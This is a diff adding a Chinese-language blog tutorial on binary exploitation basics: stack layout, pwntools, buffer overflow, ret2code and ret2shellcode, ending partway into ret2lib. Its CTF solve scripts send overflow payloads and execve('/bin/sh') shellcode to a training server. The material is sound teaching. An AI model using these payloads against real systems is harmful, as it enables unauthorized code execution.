@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言暑假做的筆記，整理格式一下之後就丟上來啦還有很多要學，繼續努力🐋 簡介漏洞攻擊從入門到放棄(?)漏洞攻擊從入門到入土(O)漏洞攻擊從入門到入獄(X)   所需要會的工具&amp;知識python pwn, Ghidra&#x2F;IDA, radare2(r2), gdb……反正就rev的東西大概要會owob程式架構、linux指令   Program Structure由低而高    Te">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn基礎筆記">
+<meta property="og:url" content="http://wha13.github.io/2023/10/12/pwn-note/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="前言暑假做的筆記，整理格式一下之後就丟上來啦還有很多要學，繼續努力🐋 簡介漏洞攻擊從入門到放棄(?)漏洞攻擊從入門到入土(O)漏洞攻擊從入門到入獄(X)   所需要會的工具&amp;知識python pwn, Ghidra&#x2F;IDA, radare2(r2), gdb……反正就rev的東西大概要會owob程式架構、linux指令   Program Structure由低而高    Te">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1brxcr63.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyVaPDOp3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJvGXcBa3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SydoBqr6n.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkiPO5STh.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1NSjcHan.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkKy8orp3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SybrPsSTn.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk2KDoSah.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyaIuir6n.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By-PijSa2.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1sh2sH6n.png">
+<meta property="article:published_time" content="2023-10-12T14:04:00.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="BOF">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="ret2code">
+<meta property="article:tag" content="ret2lib">
+<meta property="article:tag" content="GOT Hijacking">
+<meta property="article:tag" content="format string">
+<meta property="article:tag" content="Chinese">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/H1brxcr63.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Pwn基礎筆記</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/14/sunshinectf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/27/cybertea/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/12/pwn-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/12/pwn-note/&text=Pwn基礎筆記"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/12/pwn-note/&is_video=false&description=Pwn基礎筆記"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn基礎筆記&body=Check out this article: http://wha13.github.io/2023/10/12/pwn-note/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=Pwn基礎筆記"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/12/pwn-note/&name=Pwn基礎筆記&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/12/pwn-note/&t=Pwn基礎筆記"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">簡介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E8%A6%81%E6%9C%83%E7%9A%84%E5%B7%A5%E5%85%B7-%E7%9F%A5%E8%AD%98"><span class="toc-number">3.</span> <span class="toc-text">所需要會的工具&amp;知識</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Program-Structure"><span class="toc-number">4.</span> <span class="toc-text">Program Structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pwntools"><span class="toc-number">5.</span> <span class="toc-text">Python Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E5%80%91"><span class="toc-number">5.1.</span> <span class="toc-text">指令們</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-number">5.2.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">6.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-1"><span class="toc-number">6.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2code"><span class="toc-number">7.</span> <span class="toc-text">BOF Ret2code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-1"><span class="toc-number">7.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-2"><span class="toc-number">7.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2ShellCode"><span class="toc-number">8.</span> <span class="toc-text">BOF Ret2ShellCode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-2"><span class="toc-number">8.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-3"><span class="toc-number">8.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2Lib"><span class="toc-number">9.</span> <span class="toc-text">BOF Ret2Lib</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-3"><span class="toc-number">9.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lazy-Binding-%E6%A9%9F%E5%88%B6"><span class="toc-number">9.2.1.</span> <span class="toc-text">Lazy Binding 機制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Libc-Base"><span class="toc-number">9.2.2.</span> <span class="toc-text">Libc Base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95"><span class="toc-number">9.2.3.</span> <span class="toc-text">手法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-4"><span class="toc-number">9.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-Hijacking"><span class="toc-number">10.</span> <span class="toc-text">GOT Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-4"><span class="toc-number">10.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oriented-Programming"><span class="toc-number">11.</span> <span class="toc-text">Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-5"><span class="toc-number">11.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">11.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-Gadget"><span class="toc-number">11.2.1.</span> <span class="toc-text">ROP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">手法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-5"><span class="toc-number">11.3.</span> <span class="toc-text">範例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Attack"><span class="toc-number">12.</span> <span class="toc-text">Format String Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-6"><span class="toc-number">12.1.</span> <span class="toc-text">利用條件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">12.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B1"><span class="toc-number">12.3.</span> <span class="toc-text">範例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B2"><span class="toc-number">12.4.</span> <span class="toc-text">範例2</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Pwn基礎筆記
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-12T14:04:00.000Z" class="dt-published" itemprop="datePublished">2023-10-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BOF/" rel="tag">BOF</a>, <a class="p-category" href="/tags/Chinese/" rel="tag">Chinese</a>, <a class="p-category" href="/tags/GOT-Hijacking/" rel="tag">GOT Hijacking</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/format-string/" rel="tag">format string</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/ret2code/" rel="tag">ret2code</a>, <a class="p-category" href="/tags/ret2lib/" rel="tag">ret2lib</a>, <a class="p-category" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>暑假做的筆記，整理格式一下之後就丟上來啦<br>還有很多要學，繼續努力🐋</p>
+<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>漏洞攻擊從入門到放棄(?)<br>漏洞攻擊從入門到入土(O)<br><del>漏洞攻擊從入門到入獄(X)</del>  </p>
+<h2 id="所需要會的工具-知識"><a href="#所需要會的工具-知識" class="headerlink" title="所需要會的工具&amp;知識"></a>所需要會的工具&amp;知識</h2><p>python pwn, Ghidra&#x2F;IDA, radare2(r2), gdb……反正就rev的東西大概要會owob<br>程式架構、linux指令  </p>
+<h2 id="Program-Structure"><a href="#Program-Structure" class="headerlink" title="Program Structure"></a>Program Structure</h2><p>由低而高  </p>
+<ul>
+<li>Text：程式碼的部分。可讀，不可寫，可執行(r-x)  </li>
+<li>Data：已初始化的全域變數(for exam, 字串，數字等等的)  </li>
+<li>BSS：未初始化的全域變數  </li>
+<li>Heap：由低位往高位疊的動態記憶體空間  </li>
+<li>Stack：存放暫時資料(return adress, 區域變數, 參數, 回傳值)，由高位往低位拉長，最低位(長到底的地方)會有rsp。<br>Stack也是目前我所知道的攻擊手法中最容易被打的對象，由於資料是依序堆疊的，導致可能被填入大量的資料去覆蓋掉在他上面堆疊的相關資料(變數或其他資料出現順序也很重要。</li>
+</ul>
+<h2 id="Python-Pwntools"><a href="#Python-Pwntools" class="headerlink" title="Python Pwntools"></a>Python Pwntools</h2><p>要注意python3要decode, encode, b之類ㄉ…….<br>python2才是pwntools使用的最佳地點(O)  </p>
+<h3 id="指令們"><a href="#指令們" class="headerlink" title="指令們"></a>指令們</h3><ul>
+<li>連線  <ul>
+<li>某個ip, port <code>r=remote($ip, $port)</code>  </li>
+<li>某個shell檔案<code>r=process($path)</code></li>
+</ul>
+</li>
+<li>讀取資料<ul>
+<li>讀到某個字串結束<code>recvuntil(&#39;字串&#39;)</code>  </li>
+<li>讀到某個大小結束<code>recv(字節大小)</code>  </li>
+<li>讀取一行，keepends為是否讀取入’\n’<code>recvline(keepends=True)</code>  </li>
+<li>直到文件結束<code>recvcall()</code></li>
+</ul>
+</li>
+<li>送出資料<ul>
+<li>送出並換行<code>sendline(&#39;string&#39;)</code>  </li>
+<li>送出不換行<code>send(&#39;string&#39;)</code>  </li>
+<li>變成32, 64位元資料(用在整數)<code>p32(int), p64(int)</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：第一關是要輸入一個密碼，只會read前四個byte，可以用Ghidra逆向出來value後打pwntools p32() 轉換並送出。第二關是要回答一千個數學題，直接<code>eval()</code>並用python pwntools送出即可  </li>
+<li>solve script:  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2116</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwntools&#x27;)</span></span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&#x27;</span>+s.decode())</span><br><span class="line">r.sendline(p32(<span class="number">0x79487ff</span>))</span><br><span class="line"><span class="built_in">print</span>(p64(<span class="number">0x79487ff</span>))</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    question = r.recvuntil(<span class="string">&#x27;?&#x27;</span>)[:-<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">eval</span>(question)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(question)))</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(<span class="built_in">eval</span>(question))))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;meow\n&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/H1brxcr63.png"></li>
+</ul>
+<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="利用條件"><a href="#利用條件" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>沒有Stack Canary  </li>
+<li>採用get讀取char陣列，導致Overflow成立</li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用對某個buffer在stack上面overflow到stack以上的其他資料進而修改之。（radare2可以分析每個stack上面資料byte大小，確認要overflow到哪個地方。）<br>Stack Canary會根據canary值是否被改動做一次overflow確認，所以必須被關閉或者可以在overflow時不動到canary的value(或者能overwrite canary)  </p>
+<ul>
+<li>Example<br>下圖是某個被BOF的目標由Radare導出的結果，可以看到在Stack最高位的變數距離最底部為 <code>0x20</code>bytes(因為它是<code>var_20h</code>) ，所以它如果想要把<code>var_1ch</code>覆蓋掉，payload為<code>&#39;A&#39;*(0x20-0x1c)+p32(你要修改的值)</code><br><img src="https://hackmd.io/_uploads/HyVaPDOp3.png"></li>
+</ul>
+<h3 id="範例-1"><a href="#範例-1" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：輸入字串後分成兩關，第一關是要將某兩個int變成指定的value，第二關是要猜中某個random value</li>
+<li>解法：利用BOF修改兩個int value以及random的值讓他不再random</li>
+<li>solve script:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payloads=<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0xfaceb00c</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xaaaaaaaa</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2111</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./luck&#x27;)</span></span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(payloads)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/rJvGXcBa3.png"></li>
+</ul>
+<h2 id="BOF-Ret2code"><a href="#BOF-Ret2code" class="headerlink" title="BOF Ret2code"></a>BOF Ret2code</h2><h3 id="利用條件-1"><a href="#利用條件-1" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>PIE被關閉</li>
+<li>沒有Stack Canary</li>
+<li>採用get讀取char陣列，導致Overflow成立</li>
+</ul>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Overflow到一個函數return的地方，並且注入某個程式碼片段中的位址，比單純BOF多一個PIE被關閉是因為PIE會將data段和code段位址隨機化  </p>
+<h3 id="範例-2"><a href="#範例-2" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：會要你輸入一個字串並讀取</li>
+<li>解法：ghidra逆回去發現有個隱藏的函數是進到<code>/bin/sh</code>的admin功能，要overflow到ret的地方使code跑去隱藏的函數位址(可以用radare2敲出來)，最後payload在設計的時候只要記得除了把所有資料都overflow掉還要加上saved rbp的8 byte大小並接上隱藏函數的位址</li>
+<li>solve script:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>,<span class="number">2121</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x400646</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/SydoBqr6n.png"></li>
+</ul>
+<h2 id="BOF-Ret2ShellCode"><a href="#BOF-Ret2ShellCode" class="headerlink" title="BOF Ret2ShellCode"></a>BOF Ret2ShellCode</h2><h3 id="利用條件-2"><a href="#利用條件-2" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>NX被關閉</li>
+<li>PIE被關閉</li>
+<li>沒有Stack Canary</li>
+<li>採用get讀取char陣列，導致Overflow成立</li>
+</ul>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Overflow到一個函數return的地方，並且注入某個程式碼片段中的位址(此位置已被注入&#x2F;bin&#x2F;sh操作payload)，比ret2code還嚴格是因為NX會區分可執行可寫的權限不重疊，而可以注入shellcode payload的地方必須要同時能執行。<br><code>geb-vmmapn 可以確定哪些記憶體區段是可以執行的</code></p>
+<h3 id="範例-3"><a href="#範例-3" class="headerlink" title="範例"></a>範例</h3><ul>
+<li>題目大意：會要你輸入你的名字以及另一個字串的簡單c程式</li>
+<li>解法：第一次輸入從 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>上找到的linux_x86-64 shellcode字串payload</li>
+<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2122</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ret2sc&#x27;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+圖：<br><img src="https://hackmd.io/_uploads/SkiPO5STh.png"></li>
+</ul>
+<h2 id="BOF-Ret2Lib"><a href="#BOF-Ret2Lib" class="headerlink" title="BOF Ret2Lib"></a>BOF Ret2Lib</h2><h3 id="利用條件-3"><a href="#利用條件-3" class="headerlink" title="利用條件"></a>利用條件</h3><ul>
+<li>必須有辦法找到對方的lib以及某個函數在lib的位址</li>
+<li>NX被關閉</li>
+<li>PIE被關閉</li>
+<li>沒有Stack Canary</li>
+<li>採用get讀取char陣列，導致Overflow成立</li>
+</ul>
